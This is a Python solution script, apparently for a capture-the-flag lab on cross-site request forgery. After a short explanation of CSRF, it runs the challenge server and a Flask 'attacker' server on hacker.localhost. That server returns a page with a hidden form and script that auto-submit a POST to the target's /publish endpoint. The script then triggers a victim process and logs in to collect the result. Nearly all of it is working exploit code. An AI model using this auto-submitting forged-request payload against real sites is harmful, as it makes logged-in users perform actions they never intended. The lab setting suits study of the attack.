import os
import re
import requests
import sys
import time
from flask import Flask


"""
Theory:
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted
actions on a web application in which they’re currently authenticated.
CSRF does not change the website code itself, bug rather lets the user use the website
in a way the user did not intend to. I.e. we could set up a malicious server and send the
respective link via email to the user. Once the user clicks on the link while being authenticated
to the website we are actually targeting with our attack, we might force the user to send a request
to the target website by returning a redirect or form request from our malicious server.
"""

def challenge():
	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

def attack():
	app = Flask(__name__)

	@app.route("/")
	def publish_flag():
		print(f"Forcing publish!")
		sys.stdout.flush()
		return ('<html><body>'
			'<form name=pub action=http://challenge.localhost:80/publish method="post">'
			'</form><script>document.forms["pub"].submit()</script>'
			'</body></html>'
			)

	app.run("hacker.localhost", 1337, use_reloader=False)
	exit(1)

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
pat1 = re.compile(r".*Running on http://hacker.localhost:1337\n")
pat2 = re.compile(r".*Forcing publish!\n")
challenge_up = False
attacker_up = False
r1, w1 = os.pipe()

for proc in [challenge, attack]:
	pid = os.fork()

	if pid == -1:
		print("Error fork.")
		exit(1)

	if pid == 0:
		os.close(r1)

		os.dup2(w1, 1)
		os.close(w1)

		# stdout as stderr
		os.dup2(1, 2)

		proc()

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		challenge_up = True

	m = pat1.match(line)
	if m:
		attacker_up = True

	if challenge_up and attacker_up:
		challenge_up = False
		attacker_up = False
		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)

	m = pat2.match(line)
	if m:
		time.sleep(3)
		url = "http://challenge.localhost:80/login"
		data = {"username": "hacker", "password": "1337"}
		resp = requests.post(url, data=data)
		print(resp.text)
